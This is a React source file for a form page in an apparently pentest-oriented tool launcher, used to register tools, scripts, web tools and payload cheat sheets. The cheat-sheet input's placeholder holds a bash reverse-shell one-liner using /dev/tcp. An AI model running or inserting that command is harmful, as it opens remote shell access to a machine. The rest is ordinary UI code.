import React, { useState, useEffect } from 'react';
import { useApp } from '../../context/AppContext';
import { Tool, ToolType, ToolPlatform } from '../../types';
import { platformBridge } from '../../services/bridge';
import {
  Wrench,
  Globe,
  Terminal,
  FileCode,
  Bookmark,
  FolderOpen,
  Play,
  Save,
  ArrowLeft,
  CheckCircle2,
  AlertTriangle,
  Star,
  Info,
  ExternalLink,
  ShieldAlert,
  ChevronRight
} from 'lucide-react';

export const ToolStudioPage: React.FC = () => {
  const {
    tools,
    categories,
    parentCategories,
    getSubcategories,
    tags,
    editingToolId,
    initialStudioCategory,
    cancelEditTool,
    saveTool,
    launchTool,
    setActiveTab
  } = useApp();

  const isEditing = Boolean(editingToolId);
  const targetTool = isEditing ? tools.find((t) => t.id === editingToolId) : null;

  // Form states
  const [name, setName] = useState('');
  const [description, setDescription] = useState('');
  const [type, setType] = useState<ToolType>('exe');
  const [categoryId, setCategoryId] = useState('');
  const [subcategoryId, setSubcategoryId] = useState('');
  const [targetPath, setTargetPath] = useState('');
  const [defaultArgs, setDefaultArgs] = useState('');
  const [workingDir, setWorkingDir] = useState('');
  const [platform, setPlatform] = useState<ToolPlatform>('windows');
  const [isFavorite, setIsFavorite] = useState(false);
  const [openInTerminal, setOpenInTerminal] = useState(false);
  const [notes, setNotes] = useState('');
  const [selectedTags, setSelectedTags] = useState<string[]>([]);
  const [tagInput, setTagInput] = useState('');

  useEffect(() => {
    if (targetTool) {
      setName(targetTool.name);
      setDescription(targetTool.description || '');
      setType(targetTool.type);
      
      // Determine parent category and subcategory
      const currentCat = categories.find((c) => c.id === targetTool.categoryId);
      if (currentCat && currentCat.parentId) {
        // In case categoryId was pointing to a subcategory in legacy data
        setCategoryId(currentCat.parentId);
        setSubcategoryId(currentCat.id);
      } else {
        setCategoryId(targetTool.categoryId || parentCategories[0]?.id || 'cat-1');
        setSubcategoryId(targetTool.subcategoryId || '');
      }

      setTargetPath(targetTool.targetPath);
      setDefaultArgs(targetTool.defaultArgs || '');
      setWorkingDir(targetTool.workingDir || '');
      setPlatform(targetTool.platform || 'windows');
      setIsFavorite(targetTool.isFavorite);
      setOpenInTerminal(Boolean(targetTool.openInTerminal));
      setNotes(targetTool.notes || '');
      setSelectedTags(targetTool.tags || []);
    } else {
      // Defaults for new tool
      setName('');
      setDescription('');
      setType('exe');
      
      if (initialStudioCategory?.categoryId) {
        const initCat = categories.find((c) => c.id === initialStudioCategory.categoryId);
        if (initCat && initCat.parentId) {
          setCategoryId(initCat.parentId);
          setSubcategoryId(initCat.id);
        } else {
          setCategoryId(initialStudioCategory.categoryId);
          setSubcategoryId(initialStudioCategory.subcategoryId || '');
        }
      } else {
        setCategoryId(parentCategories[0]?.id || 'cat-1');
        setSubcategoryId('');
      }

      setTargetPath('');
      setDefaultArgs('');
      setWorkingDir('');
      setPlatform('windows');
      setIsFavorite(false);
      setOpenInTerminal(false);
      setNotes('');
      setSelectedTags(['recon']);
    }
  }, [targetTool, initialStudioCategory, parentCategories, categories]);

  // Browse local executable or file
  const handleBrowseFile = async () => {
    let extensions = ['exe', 'bat', 'cmd', 'ps1', 'py', 'sh', 'jar'];
    if (type === 'script') {
      extensions = ['py', 'sh', 'ps1', 'rb', 'pl', 'js'];
    }
    const picked = await platformBridge.selectFile([
      { name: '可执行工具或脚本', extensions },
      { name: '所有文件', extensions: ['*'] },
    ]);
    if (picked) {
      setTargetPath(picked);
      if (!name) {
        // Auto fill name from file
        const fileName = picked.split(/[\\/]/).pop()?.replace(/\.[^/.]+$/, '') || '';
        if (fileName) setName(fileName);
      }
      if (!workingDir) {
        const dir = picked.substring(0, Math.max(picked.lastIndexOf('/'), picked.lastIndexOf('\\')));
        if (dir) setWorkingDir(dir);
      }
    }
  };

  // Browse directory
  const handleBrowseDir = async () => {
    const picked = await platformBridge.selectDirectory();
    if (picked) {
      setWorkingDir(picked);
    }
  };

  // Tag addition
  const handleAddTag = () => {
    if (!tagInput.trim()) return;
    const clean = tagInput.trim().toLowerCase().replace(/^#/, '');
    if (!selectedTags.includes(clean)) {
      setSelectedTags([...selectedTags, clean]);
    }
    setTagInput('');
  };

  const handleRemoveTag = (tagToRemove: string) => {
    setSelectedTags(selectedTags.filter((t) => t !== tagToRemove));
  };

  // Active parent and subcategories for the selector
  const availableSubcategories = categoryId ? getSubcategories(categoryId) : [];
  const parentCat = categories.find((c) => c.id === categoryId);
  const subCat = subcategoryId ? categories.find((c) => c.id === subcategoryId) : null;

  // Live draft tool object for preview
  const livePreviewTool: Tool = {
    id: targetTool?.id || 'preview_id',
    name: name || '工具名称预览',
    description: description || '这里将展示工具的功能简介与应用场景...',
    type,
    categoryId: categoryId || parentCategories[0]?.id || 'cat-1',
    subcategoryId: subcategoryId || undefined,
    tags: selectedTags,
    targetPath: targetPath || (type === 'web' ? 'https://example.com' : 'C:\\Tools\\tool.exe'),
    defaultArgs,
    workingDir,
    platform,
    isFavorite,
    sortOrder: targetTool?.sortOrder || 1,
    usageCount: targetTool?.usageCount || 0,
    createdAt: targetTool?.createdAt || new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    notes,
    openInTerminal,
  };

  // Readiness diagnostics
  const isPathValid = Boolean(targetPath.trim());
  const isNameValid = Boolean(name.trim());
  const isCategoryValid = Boolean(categoryId);
  const readinessScore = (isNameValid ? 40 : 0) + (isPathValid ? 40 : 0) + (isCategoryValid ? 20 : 0);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isNameValid || !isPathValid) return;

    await saveTool(livePreviewTool);
    setActiveTab('tools');
  };

  return (
    <div className="p-6 space-y-6 max-w-7xl mx-auto w-full">
      {/* 1. Page Header with Back Button */}
      <div className="flex items-center justify-between pb-3 border-b border-[#1e293b]">
        <div className="flex items-center space-x-3">
          <button
            type="button"
            onClick={cancelEditTool}
            className="p-1.5 rounded-lg bg-[#111827] border border-[#1e293b] text-[#94a3b8] hover:text-white hover:bg-[#162032] transition-colors"
            title="返回工具列表"
          >
            <ArrowLeft className="w-4 h-4" />
          </button>
          <div>
            <h1 className="text-xl font-bold text-[#f1f5f9] flex items-center space-x-2">
              <span>{isEditing ? `编辑工具: ${targetTool?.name}` : '登记新安全工具'}</span>
              <span className="text-xs px-2 py-0.5 rounded-full bg-[#1e293b] text-[#38bdf8] font-mono">
                Tool Studio
              </span>
            </h1>
            <p className="text-xs text-[#94a3b8] mt-0.5">
              配置层级战术分类（一级大类 + 二级子类）、执行路径与参数，并在右侧进行实时诊断
            </p>
          </div>
        </div>

        <div className="flex items-center space-x-2">
          <button
            type="button"
            onClick={cancelEditTool}
            className="px-3.5 py-1.5 rounded-lg border border-[#1e293b] text-xs text-[#94a3b8] hover:text-white hover:bg-[#162032]"
          >
            取消返回
          </button>
          <button
            type="button"
            onClick={handleSubmit}
            disabled={!isNameValid || !isPathValid}
            className="px-4 py-1.5 rounded-lg bg-[#0284c7] hover:bg-[#0369a1] disabled:opacity-50 text-white text-xs font-medium flex items-center space-x-1.5 shadow-sm"
          >
            <Save className="w-3.5 h-3.5" />
            <span>保存并生效</span>
          </button>
        </div>
      </div>

      {/* 2. Main Two-Column Studio Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Form Column (7 cols ~ 58%) */}
        <form onSubmit={handleSubmit} className="lg:col-span-7 space-y-4">
          <div className="p-5 rounded-xl bg-[#111827] border border-[#1e293b] space-y-4">
            {/* Tool Type Selector */}
            <div>
              <label className="block text-xs font-medium text-[#94a3b8] mb-2">
                工具运行形态 *
              </label>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                {[
                  { id: 'exe', label: '本地程序', desc: '可执行二进制 / GUI', icon: Terminal },
                  { id: 'script', label: '脚本/CLI', desc: 'Python/Bash/PS1', icon: FileCode },
                  { id: 'web', label: 'Web工具', desc: '在线渗透站点/API', icon: Globe },
                  { id: 'cheat_sheet', label: '备忘手册', desc: '速查 / 反弹Payload', icon: Bookmark },
                ].map((item) => {
                  const active = type === item.id;
                  const Icon = item.icon;
                  return (
                    <div
                      key={item.id}
                      onClick={() => setType(item.id as ToolType)}
                      className={`p-3 rounded-lg border cursor-pointer transition-all ${
                        active
                          ? 'bg-[#162032] border-[#38bdf8] text-[#38bdf8] shadow-sm'
                          : 'bg-[#0d121f] border-[#1e293b] text-[#94a3b8] hover:border-[#38bdf8]/40 hover:text-[#f1f5f9]'
                      }`}
                    >
                      <Icon className="w-4 h-4" />
                      <div className="font-semibold text-xs text-[#f1f5f9] mt-1">{item.label}</div>
                      <div className="text-[10px] text-[#64748b]">{item.desc}</div>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Name */}
            <div>
              <label className="block text-xs font-medium text-[#94a3b8] mb-1">
                工具显示名称 *
              </label>
              <input
                type="text"
                required
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder="例如: Burp Suite Professional"
                className="w-full bg-[#0d121f] border border-[#1e293b] focus:border-[#38bdf8] rounded-lg px-3 py-2 text-xs text-[#f1f5f9] placeholder-[#64748b] focus:outline-none"
              />
            </div>

            {/* Hierarchical Categories (Parent & Subcategory) */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <label className="block text-xs font-medium text-[#94a3b8] mb-1">
                  所属一级大类 *
                </label>
                <select
                  value={categoryId}
                  onChange={(e) => {
                    setCategoryId(e.target.value);
                    setSubcategoryId('');
                  }}
                  className="w-full bg-[#0d121f] border border-[#1e293b] focus:border-[#38bdf8] rounded-lg px-3 py-2 text-xs text-[#f1f5f9] focus:outline-none"
                >
                  {parentCategories.map((c) => (
                    <option key={c.id} value={c.id}>
                      {c.name} ({c.slug})
                    </option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-xs font-medium text-[#94a3b8] mb-1">
                  所属二级子类 (细分战术场景)
                </label>
                <select
                  value={subcategoryId}
                  onChange={(e) => setSubcategoryId(e.target.value)}
                  className="w-full bg-[#0d121f] border border-[#1e293b] focus:border-[#38bdf8] rounded-lg px-3 py-2 text-xs text-[#f1f5f9] focus:outline-none"
                >
                  <option value="">(无二级子类 / 直属该大类)</option>
                  {availableSubcategories.map((s) => (
                    <option key={s.id} value={s.id}>
                      ↳ {s.name} ({s.slug})
                    </option>
                  ))}
                </select>
              </div>
            </div>

            {/* Target Path / URL */}
            <div>
              <label className="block text-xs font-medium text-[#94a3b8] mb-1">
                {type === 'web'
                  ? '站点 URL 地址 *'
                  : type === 'cheat_sheet'
                  ? '备忘指令 / Payload 内容 *'
                  : '工具可执行文件路径 / 命令 *'}
              </label>
              <div className="flex items-center space-x-2">
                <input
                  type="text"
                  required
                  value={targetPath}
                  onChange={(e) => setTargetPath(e.target.value)}
                  placeholder={
                    type === 'web'
                      ? 'https://gchq.github.io/CyberChef/'
                      : type === 'cheat_sheet'
                      ? 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
                      : 'C:\\Program Files\\Tools\\tool.exe'
                  }
                  className="flex-1 bg-[#0d121f] border border-[#1e293b] focus:border-[#38bdf8] rounded-lg px-3 py-2 text-xs font-mono text-[#f1f5f9] placeholder-[#64748b] focus:outline-none"
                />
                {(type === 'exe' || type === 'script') && (
                  <button
                    type="button"
                    onClick={handleBrowseFile}
                    className="px-3 py-2 rounded-lg bg-[#162032] hover:bg-[#1e293b] border border-[#1e293b] text-xs text-[#38bdf8] flex items-center space-x-1.5 flex-shrink-0"
                  >
                    <FolderOpen className="w-3.5 h-3.5" />
                    <span>浏览文件</span>
                  </button>
                )}
              </div>
            </div>

            {/* Default Arguments & Working Dir (for exe and script) */}
            {(type === 'exe' || type === 'script') && (
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-[#94a3b8] mb-1">
                    默认启动参数 (可选)
                  </label>
                  <input
                    type="text"
                    value={defaultArgs}
                    onChange={(e) => setDefaultArgs(e.target.value)}
                    placeholder="-sV -sC -T4"
                    className="w-full bg-[#0d121f] border border-[#1e293b] focus:border-[#38bdf8] rounded-lg px-3 py-2 text-xs font-mono text-[#f1f5f9] placeholder-[#64748b] focus:outline-none"
                  />
                </div>

                <div>
                  <label className="block text-xs font-medium text-[#94a3b8] mb-1">
                    自定义工作目录 (CWD)
                  </label>
                  <div className="flex items-center space-x-2">
                    <input
                      type="text"
                      value={workingDir}
                      onChange={(e) => setWorkingDir(e.target.value)}
                      placeholder="C:\Tools\nmap"
                      className="flex-1 bg-[#0d121f] border border-[#1e293b] focus:border-[#38bdf8] rounded-lg px-3 py-2 text-xs font-mono text-[#f1f5f9] placeholder-[#64748b] focus:outline-none"
                    />
                    <button
                      type="button"
                      onClick={handleBrowseDir}
                      className="p-2 rounded-lg bg-[#162032] hover:bg-[#1e293b] border border-[#1e293b] text-xs text-[#94a3b8] hover:text-white"
                      title="选择目录"
                    >
                      <FolderOpen className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
              </div>
            )}

            {/* Description */}
            <div>
              <label className="block text-xs font-medium text-[#94a3b8] mb-1">功能描述简介</label>
              <textarea
                rows={2}
                value={description}
                onChange={(e) => setDescription(e.target.value)}
                placeholder="简述该工具的攻防测试定位、支持协议及核心特性..."
                className="w-full bg-[#0d121f] border border-[#1e293b] focus:border-[#38bdf8] rounded-lg px-3 py-2 text-xs text-[#f1f5f9] placeholder-[#64748b] focus:outline-none"
              />
            </div>

            {/* Tags Input */}
            <div>
              <label className="block text-xs font-medium text-[#94a3b8] mb-1.5">
                安全标签池 (按回车快速添加)
              </label>
              <div className="p-2.5 rounded-lg bg-[#0d121f] border border-[#1e293b] flex flex-wrap items-center gap-1.5">
                {selectedTags.map((tag) => (
                  <span
                    key={tag}
                    className="inline-flex items-center space-x-1 px-2 py-0.5 rounded bg-[#162032] text-xs font-mono text-[#38bdf8] border border-[#38bdf8]/30"
                  >
                    <span>#{tag}</span>
                    <button
                      type="button"
                      onClick={() => handleRemoveTag(tag)}
                      className="hover:text-rose-400"
                    >
                      ×
                    </button>
                  </span>
                ))}
                <div className="flex-1 min-w-[120px]">
                  <input
                    type="text"
                    value={tagInput}
                    onChange={(e) => setTagInput(e.target.value)}
                    onKeyDown={(e) => {
                      if (e.key === 'Enter') {
                        e.preventDefault();
                        handleAddTag();
                      }
                    }}
                    placeholder="+ 输完回车添加标签"
                    className="bg-transparent text-xs text-[#f1f5f9] placeholder-[#64748b] focus:outline-none w-full"
                  />
                </div>
              </div>
            </div>

            {/* Options Checkboxes */}
            <div className="pt-2 border-t border-[#1e293b] flex flex-wrap gap-4 text-xs">
              <label className="flex items-center space-x-2 cursor-pointer text-[#f1f5f9]">
                <input
                  type="checkbox"
                  checked={isFavorite}
                  onChange={(e) => setIsFavorite(e.target.checked)}
                  className="rounded bg-[#0d121f] border-[#1e293b] text-[#0284c7] focus:ring-0"
                />
                <span className="flex items-center space-x-1">
                  <Star className="w-3.5 h-3.5 text-amber-400 fill-amber-400" />
                  <span>设为常驻收藏工具</span>
                </span>
              </label>

              {(type === 'exe' || type === 'script') && (
                <label className="flex items-center space-x-2 cursor-pointer text-[#f1f5f9]">
                  <input
                    type="checkbox"
                    checked={openInTerminal}
                    onChange={(e) => setOpenInTerminal(e.target.checked)}
                    className="rounded bg-[#0d121f] border-[#1e293b] text-[#0284c7] focus:ring-0"
                  />
                  <span>在独立终端交互窗口中运行 (Windows Terminal)</span>
                </label>
              )}
            </div>
          </div>
        </form>

        {/* Right WYSIWYG & Diagnostic Column (5 cols ~ 42%) */}
        <div className="lg:col-span-5 space-y-4">
          {/* Live Card Preview Box */}
          <div className="p-4 rounded-xl bg-[#111827] border border-[#1e293b] space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-semibold text-[#f1f5f9]">所见即所得卡片预览</span>
              <span className="text-[10px] text-[#38bdf8] font-mono">LIVE PREVIEW</span>
            </div>

            {/* The rendered Tool Card */}
            <div className="p-4 rounded-xl bg-[#0d121f] border border-[#1e293b] shadow-md space-y-3">
              <div className="flex items-start justify-between">
                <div className="flex items-center space-x-2.5">
                  <div className="w-9 h-9 rounded-lg bg-[#162032] border border-[#1e293b] flex items-center justify-center text-[#38bdf8]">
                    {type === 'web' ? (
                      <Globe className="w-4 h-4 text-emerald-400" />
                    ) : type === 'script' ? (
                      <FileCode className="w-4 h-4 text-amber-400" />
                    ) : type === 'cheat_sheet' ? (
                      <Bookmark className="w-4 h-4 text-blue-400" />
                    ) : (
                      <Terminal className="w-4 h-4 text-[#38bdf8]" />
                    )}
                  </div>
                  <div>
                    <h4 className="text-sm font-semibold text-[#f1f5f9]">
                      {name || '工具名称'}
                    </h4>
                    <div className="flex items-center space-x-1.5 mt-0.5">
                      {parentCat && (
                        <span
                          className="text-[10px] px-1.5 py-0.2 rounded border flex items-center space-x-1"
                          style={{
                            borderColor: `${parentCat.color || '#38bdf8'}40`,
                            color: parentCat.color || '#38bdf8',
                            backgroundColor: `${parentCat.color || '#38bdf8'}10`,
                          }}
                        >
                          <span>{parentCat.name}</span>
                          {subCat && (
                            <>
                              <span className="opacity-60">›</span>
                              <span className="font-semibold text-white">{subCat.name}</span>
                            </>
                          )}
                        </span>
                      )}
                      <span className="text-[10px] text-[#64748b] font-mono uppercase">
                        {type}
                      </span>
                    </div>
                  </div>
                </div>

                <Star
                  className={`w-4 h-4 ${
                    isFavorite ? 'text-amber-400 fill-amber-400' : 'text-[#475569]'
                  }`}
                />
              </div>

              <p className="text-xs text-[#94a3b8] line-clamp-2">
                {description || '暂无工具描述内容...'}
              </p>

              <div className="px-2 py-1 rounded bg-[#111827] border border-[#1e293b] text-[11px] font-mono text-[#64748b] truncate">
                {targetPath || '未设定启动路径'}
              </div>

              {selectedTags.length > 0 && (
                <div className="flex flex-wrap gap-1">
                  {selectedTags.map((tag) => (
                    <span
                      key={tag}
                      className="text-[10px] px-1.5 py-0.5 rounded bg-[#162032] text-[#94a3b8]"
                    >
                      #{tag}
                    </span>
                  ))}
                </div>
              )}
            </div>
          </div>

          {/* Configuration Diagnostics */}
          <div className="p-4 rounded-xl bg-[#111827] border border-[#1e293b] space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-semibold text-[#f1f5f9]">配置就绪度诊断</span>
              <span
                className={`text-xs font-mono font-bold ${
                  readinessScore === 100
                    ? 'text-emerald-400'
                    : readinessScore > 50
                    ? 'text-amber-400'
                    : 'text-rose-400'
                }`}
              >
                {readinessScore}%
              </span>
            </div>

            <div className="space-y-2 text-xs">
              <div className="flex items-center justify-between">
                <span className="text-[#94a3b8]">工具名称完整度</span>
                {isNameValid ? (
                  <span className="text-emerald-400 flex items-center space-x-1">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>通过</span>
                  </span>
                ) : (
                  <span className="text-rose-400 flex items-center space-x-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    <span>必填项缺失</span>
                  </span>
                )}
              </div>

              <div className="flex items-center justify-between">
                <span className="text-[#94a3b8]">目标路径 / 指令</span>
                {isPathValid ? (
                  <span className="text-emerald-400 flex items-center space-x-1">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>通过</span>
                  </span>
                ) : (
                  <span className="text-rose-400 flex items-center space-x-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    <span>必填项缺失</span>
                  </span>
                )}
              </div>

              <div className="flex items-center justify-between">
                <span className="text-[#94a3b8]">战术分类绑定</span>
                <span className="text-emerald-400 flex items-center space-x-1">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>
                    {parentCat?.name || '已选定'}
                    {subCat ? ` › ${subCat.name}` : ''}
                  </span>
                </span>
              </div>
            </div>

            {/* Test launch button inside studio */}
            <div className="pt-2 border-t border-[#1e293b]">
              <button
                type="button"
                onClick={() => launchTool(livePreviewTool)}
                disabled={!isPathValid}
                className="w-full py-2 rounded-lg bg-[#162032] hover:bg-[#1e293b] border border-[#1e293b] text-xs text-[#38bdf8] font-medium flex items-center justify-center space-x-1.5 disabled:opacity-40 transition-colors"
              >
                <Play className="w-3.5 h-3.5 fill-[#38bdf8]" />
                <span>立即测试启动 (验证命令有效性)</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
